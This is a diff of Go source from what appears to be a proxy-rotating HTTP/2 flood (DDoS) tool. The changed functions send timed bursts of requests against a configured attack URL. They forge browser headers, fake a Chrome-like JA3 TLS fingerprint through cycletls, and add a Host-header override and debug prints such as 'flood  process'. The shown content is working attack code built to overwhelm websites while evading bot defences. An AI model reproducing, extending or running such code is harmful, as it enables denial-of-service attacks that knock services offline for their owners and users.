@@ -18,7 +18,7 @@ func HTTP2(wg *sync.WaitGroup) {
 	errs = -1
 restart:
 	proxy := LoadedProxies[rand.Intn(len(LoadedProxies))]
-	//fmt.Println(proxy)
+	fmt.Println(proxy)
 	url, err := url2.Parse(fmt.Sprintf("http://%s", proxy))
 	if err != nil {
 		fmt.Println("Error by Parsing Proxy. Check Proxies file.")
@@ -60,12 +60,16 @@ restart:
 	req.Header.Set("sec-fetch-mode", "navigate")
 	req.Header.Set("sec-fetch-user", "?1")
 	req.Header.Set("sec-fetch-dest", "document")
+	fmt.Println("before start")
 	if errs == -1 {
 		wg.Done()
 		<-start
 	}
+	fmt.Println("started")
 	for range time.Tick(time.Millisecond * time.Duration(1000.0/Sys.Attack.RequestsPerIP)) {
+		fmt.Println("before request")
 		_, err = client.Do(req)
+		fmt.Println("request")
 		if err != nil {
 			errs++
 			if errs > 10 {
@@ -82,6 +86,9 @@ func TLS_HTTP2(wg *sync.WaitGroup) {
 restart:
 	proxy := LoadedProxies[rand.Intn(len(LoadedProxies))]
 	headers := make(map[string]string)
+	if Sys.Attack.Host != "" {
+		headers["Host"] = Sys.Attack.Host
+	}
 	headers["sec-ch-ua-mobile"] = "?0"
 	headers["upgrade-insecure-requests"] = "1"
 	headers["cache-control"] = "max-age=0"
@@ -90,17 +97,20 @@ restart:
 	headers["sec-fetch-dest"] = "document"
 	client := cycletls.Init()
 	options := cycletls.Options{
-		Proxy:     proxy,
+		Proxy:     "http://" + proxy,
 		Ja3:       "771,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-51-57-47-53-10,0-23-65281-10-11-35-16-5-51-43-13-45-28-21,29-23-24-25-256-257,0",
 		UserAgent: UserAgents[rand.Intn(len(UserAgents))],
-		Headers:   headers,
-		Timeout:   Sys.HTTP2Timeout,
+		//Headers:   headers,
+		Timeout: Sys.HTTP2Timeout,
 	}
+	fmt.Println("options set up")
 	if errs == -1 {
 		wg.Done()
 		<-start
 	}
+	fmt.Println("flood  process")
 	for range time.Tick(time.Millisecond * time.Duration(1000.0/Sys.Attack.RequestsPerIP)) {
+		fmt.Println("request")
 		_, err := client.Do(Sys.Attack.Url, options, Sys.Attack.AttackMethod)
 		if err != nil {
 			errs++
